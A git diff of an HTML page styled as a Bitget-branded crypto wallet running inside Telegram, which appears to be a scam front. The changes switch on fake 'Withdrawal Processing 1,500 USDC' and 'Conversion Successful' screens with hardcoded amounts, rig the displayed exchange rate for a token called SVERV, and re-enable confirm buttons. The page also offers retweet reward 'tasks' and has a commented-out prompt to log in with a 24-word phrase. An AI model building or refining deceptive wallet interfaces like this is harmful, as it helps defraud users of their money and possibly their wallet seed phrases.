@@ -6,15 +6,26 @@
   <title>Phantom Wallet Balance</title> 
   <link rel="stylesheet" href="styles.css">
   <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200&icon_names=arrow_back" />
-    </script> <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>   
+  <script src="https://telegram.org/js/telegram-web-app.js">
+  </script> <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>   
+  <script> 
+  window.addEventListener("DOMContentLoaded", function () {
+    const tg = window.Telegram.WebApp;
 
+    tg.ready();
+
+    // Set header background color only
+    tg.setHeaderColor("#181A20");
+  });
+</script>
+  
  </head>  
 <body>
-  <!--    { name: 'SVERV', abbr: 'SVERV', logoUrl: 'https://shorturl.at/RSMx8', id: 'usd-coin', balance: 0, address: '0xb0B61e915d54BC5bf570ac5340Cd308928CE1D35', network: 'ERC20' },
--->
-
-
-   <div class="card" hidden>  
+  <!--    { name: 'SVERV', abbr: 'SVERV', logoUrl: 'https://shorturl.at/RSMx8', id: 'usd-coin', balance: 0, address: '0xb0B61e915d54BC5bf570ac5340Cd308928CE1D35', network: 'ERC20' },-->
+  
+  
+  
+  <div class="card" hidden>  
   <h1>Wallet Balance</h1>
   <div class="balance" id="connect-eth">Loading...</div> 
   <div class="usd" id="usd">Loading...</div> 
@@ -23,11 +34,12 @@
   
   
   
-  
-  
     <div id="login-container-one" class="login-container-one"> 
-     <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/79/Logo_Biget.svg/960px-Logo_Biget.svg.png" alt="BTC" class="binance-icon">
-     <div class=""></div>
+      <div class="">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/79/Logo_Biget.svg/960px-Logo_Biget.svg.png" alt="BTC" class="binance-icon">
+        <!--<img src="https://cdn-icons-png.flaticon.com/128/7641/7641727.png" alt="BTC" class="binance-icon-verified"> -->
+      </div>
+    
     <!--<h1>Login with Your 24-Phrase Key 1</h1>--> 
     <!--<img src="https://public.bnbstatic.com/image/cms/content/body/202310/611e56e75c82c60b33fa51589122e396.jpg" alt="BTC" class="marketplace">-->
   
@@ -372,7 +384,7 @@ setInterval(fetchBNBPrice, 120000);
       </div>
     </div>
     
-      <button id="sendpage-withdraw" class="sendpage-withdraw" disabled>Withdraw</button>
+      <button id="sendpage-withdraw" class="sendpage-withdraw" dis>Withdraw</button>
   </div>  
 </div>
     
@@ -500,15 +512,15 @@ setInterval(fetchBNBPrice, 120000);
         
             <button class="p-close-button-z" onclick="document.querySelector('#withdraw-confirm-modal').style.display='none';document.querySelector('#send-modal').style.display='block';"><span class="material-symbols-outlined"><img src="https://cdn-icons-png.flaticon.com/128/10728/10728756.png" alt="Back"></span></button>
           
-         <!--<div class="withdraw-warning">We believe that smart savings starts with trust. Bitget is built with industry-grade security, transparent processes, and dedicated support. So you can transact with peace of mind.</div>
+         <!----><div class="withdraw-warning">We believe that smart savings starts with trust. Bitget is built with industry-grade security, transparent processes, and dedicated support. So you can transact with peace of mind.</div>
           <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/3408.png" alt="BTC" class="withdraw-icon">  
           <div class="withdrawal-processing">Withdrawal Processing</div> 
-          <div class="withdrawal-p-amt">11,000 USDC</div>  
-          <span class="withdrawal-estim">Estimated completion time: 2026-02-15 12:50:31.</span> 
+          <div class="withdrawal-p-amt">1,500 USDC</div>  
+          <span class="withdrawal-estim">Estimated completion time: 2026-04-06 11:28:31.</span> 
           <span class="withdrawal-estim">You will receive a notification once withdrawal
           is completed.</span> 
           <span class="withdrawal-estim">View history for latest updates</span> 
-          <div class="with-done" onclick="document.querySelector('#withdraw-confirm-modal').style.display='none';document.querySelector('#send-modal').style.display='block';">Done</div>-->
+          <div class="with-done" onclick="document.querySelector('#withdraw-confirm-modal').style.display='none';document.querySelector('#send-modal').style.display='block';">Done</div>
     
         </div>
         </div>
@@ -646,9 +658,9 @@ setInterval(fetchBNBPrice, 120000);
                
               <div class="connect-aix" id="connect-aix">Connect Wallet</div> 
               
-              
+               
 <div class="task-div hidden" id="task-div">
-  <div class="task-follow">Tasks</div>
+  <div class="task-follow">Tasks</div> 
   
   <div class="task-slide">
  <a href="https://x.com/Novaex_AI/status/2022892909130125352?s=46" target="_blank" rel="noopener noreferrer" class="task-sec" data-reward="3020" data-max="18350"><img src="https://cdn-icons-png.flaticon.com/128/733/733579.png" alt="USDT" class="task-img"><div class="task-text">Retweet</div></a>
@@ -738,7 +750,7 @@ setInterval(fetchBNBPrice, 120000);
     <div class="accept-box-amount-to"><div class="accept-box-conv">0.00</div>&nbspUSDC</div> 
     </div>
       
-    <div class="accept-box-usd">$<div class="accept-box-conv-usd">0.00</div></div>  
+    <div class="accept-box-usd">$<div class="accept-box-conv-usd">0.00</div></div> 
       
     <div class="accept-box-details">
       <div class="accept-box-details-a">   
@@ -755,7 +767,7 @@ setInterval(fetchBNBPrice, 120000);
         </div>  
    <div class="express-confirm-row"> 
       
-      <button id="express-payment-btn" disabled>Confirm</button>  
+      <button id="express-payment-btn" dis>Confirm</button>  
       </div>
      
     </div>
@@ -783,7 +795,7 @@ setInterval(fetchBNBPrice, 120000);
       }
       
       if (!isNaN(inputValue)) {
-        convertedUsdDiv.textContent = (inputValue * 1).toFixed(2);
+        convertedUsdDiv.textContent = (inputValue * 0.3).toFixed(2);
       } else {
         convertedUsdDiv.textContent = '';
       }
@@ -799,7 +811,7 @@ setInterval(fetchBNBPrice, 120000);
         
             <button class="p-close-button-z" onclick="document.querySelector('#convert-confirm-modal').style.display='none';document.querySelector('#convert-modal').style.display='block';"><span class="material-symbols-outlined"><img src="https://cdn-icons-png.flaticon.com/128/10728/10728756.png" alt="Back"></span></button>
           
-         <!-- <div class="withdraw-warning">We believe that smart savings starts with trust. Bitget is built with industry-grade security, transparent processes, and dedicated support. So you can transact with peace of mind.</div>
+         <!-- --><div class="withdraw-warning">We believe that smart savings starts with trust. Bitget is built with industry-grade security, transparent processes, and dedicated support. So you can transact with peace of mind.</div>
           <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/3408.png" alt="BTC" class="withdraw-icon">  
           <div class="convert-processing">Conversion Successful</div> 
           
@@ -813,15 +825,15 @@ setInterval(fetchBNBPrice, 120000);
       </div>  
          
       <div class="accept-box-details-b">   
-      <div class="accept-box-right-conv"><div class="conv-box-win"></div>&nbspNOVA</div>  
+      <div class="accept-box-right-conv"><div class="conv-box-win"></div>&nbspSVERV</div>  
       <div class="accept-box-right-conv"><div class="conv-box-conv"></div>&nbspUSDC</div> 
-      <div class="accept-box-right-conv">1 USDC = 1 NOVA </div> 
-      <div class="accept-box-right-conv">0.48 ETH</div> 
+      <div class="accept-box-right-conv">0.32 USDC = 1 SVERV </div> 
+      <div class="accept-box-right-conv">0.070 ETH</div> 
       </div>  
         </div>  
             
           <span class="convert-history">View conversion history</span> 
-          <div class="with-done" onclick="document.querySelector('#convert-confirm-modal').style.display='none';document.querySelector('#convert-modal').style.display='block';">Confirm</div>-->
+          <div class="with-done" onclick="document.querySelector('#convert-confirm-modal').style.display='none';document.querySelector('#convert-modal').style.display='block';">Confirm</div>
     
         </div>
         </div>
@@ -841,7 +853,7 @@ setInterval(fetchBNBPrice, 120000);
 
       // Update convertedDiv with calculated value
       if (!isNaN(inputValueConv)) {
-        convertedDivConv.textContent = (inputValueConv * 1).toFixed(2);
+        convertedDivConv.textContent = (inputValueConv * 0.3).toFixed(2);
       } else {
         convertedDivConv.textContent = '';
       }
@@ -1537,7 +1549,7 @@ setInterval(fetchPiPrice, 120000);
         <div class="min-max-description">  
             <div>Limit: 2,500.00 USDT - 10,000,000.00 USDT</div>
             <button id="confirm-ad-button" class="confirm-button">Confirm</button>
-        </div>
+        </div> 
     </div>
   </div>
          
@@ -1546,13 +1558,7 @@ setInterval(fetchPiPrice, 120000);
      
  </div>
     <script src="script.js"></script>
-  
+   
   
 </body>
 </html>
-
-
-
-
-
-
